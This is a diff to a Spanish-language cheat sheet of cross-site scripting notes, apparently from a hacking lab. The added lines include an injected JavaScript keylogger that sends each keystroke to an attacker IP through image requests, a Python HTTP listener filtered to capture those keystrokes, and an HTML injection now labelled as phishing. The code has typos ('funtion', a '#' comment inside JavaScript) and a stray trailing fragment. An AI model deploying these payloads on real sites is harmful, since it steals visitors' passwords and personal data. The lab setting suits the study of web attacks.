@@ -21,7 +21,7 @@ A continuación, se proporciona el proyecto de Github correspondiente al laborat
 
 ## Comandos 
 
-Los XSS pueden interpretar codigo en **JavaScript** y es ahi en donde podemos colocar las ineycciones.
+Los XSS pueden interpretar codigo en **HTML y/o  JavaScript** y es ahi en donde podemos colocar las ineycciones.
 
 ```javascript
 <script>alert("XSS")</script>                                                      # Creamos una ventana emergente con codigo javascript que dice XSS
@@ -45,7 +45,7 @@ Podemos crear un script en donde nos devuleva el correo o algun dato a nuestra I
 ```
 
 
-Tambien lo podemos hacer con HTML
+Tambien lo podemos hacer con HTML (Phishing)
 ```html
 <div id="formContainer"></div>
 
@@ -70,4 +70,27 @@ Tambien lo podemos hacer con HTML
 
 ```bash
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80 para recibir las peticiones 
+```
+
+
+Podemos crear un Keylogger JavaScript
+```javascript
+<script>
+   var k = "";    document.onkeypress = funtion(e){
+        e = e || window.event; # Opcional para que en cualquier navegador funcione el Keylogger
+        k += e.key;
+        var i = new Image();
+        i.src = "http://192.168.68.111/" + k;
+    };
+</script>
+```
+
+```bash
+❯ python3 -m http.server 80  | grep -oP "GET /\k[^.*\s]+"      # Nos montamos un servidor http 80 para recibir las peticiones y que las filtre 
+```
+
+
+ss
+```javascript
+
 ```
